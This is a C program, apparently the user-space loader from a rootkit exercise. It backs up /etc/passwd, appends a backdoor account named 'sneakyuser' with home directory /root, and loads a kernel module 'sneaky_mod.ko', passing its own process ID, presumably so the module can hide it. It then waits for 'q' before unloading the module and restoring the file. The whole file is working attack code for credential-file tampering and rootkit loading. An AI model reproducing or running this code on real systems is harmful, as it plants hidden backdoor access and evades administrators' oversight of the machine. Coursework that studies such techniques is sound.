#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void cp_file() {
  const char * cp_call = "cp /etc/passwd /tmp/passwd";
  printf("%s\n", cp_call);
  system(cp_call);
  return;
}

void add_sneaky_user() {
  //Use a mode to open file for appending
  FILE * passwd_file = fopen("/etc/passwd", "a");
  const char * new_user = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  if (passwd_file == NULL) {
    printf("Cannot open /etc/passwd\n");
    exit(EXIT_FAILURE);
  }
  fprintf(passwd_file, "%s\n", new_user);
  printf("Update /etc/passwd with the sneakyuser.\n");
  fclose(passwd_file);
  return;
}

void recover_file() {
  const char * cp_call = "cp /tmp/passwd /etc/passwd";
  printf("%s\n", cp_call);
  system(cp_call);
  return;
}

void load_module(long int pid) {
  char insmod_call[100];
  sprintf(insmod_call, "insmod sneaky_mod.ko pid=%ld", pid);
  system(insmod_call);
  printf("%s\n", insmod_call);
}

void unload_module() {
  system("rmmod sneaky_mod");
  printf("remove the module\n");
}

void infinite_loop() {
  printf("Enter q to exit\n");
  char command[1024];
  while (1) {
    fgets(command, sizeof(command), stdin);
    if (strcmp(command, "q\n") == 0) {
      break;
    }
  }
}

int main(void) {
  //print own process ID
  long int pid = getpid();
  printf("sneaky_process pid = %ld\n", pid);
  //copy the passwd file
  //recover_file();
  cp_file();
  //Line to be added into /etc/passwd is
  add_sneaky_user();

  //load the module
  load_module(pid);

  infinite_loop();

  //unload the module
  unload_module();

  //recover the passwd file
  recover_file();
  return EXIT_SUCCESS;
}
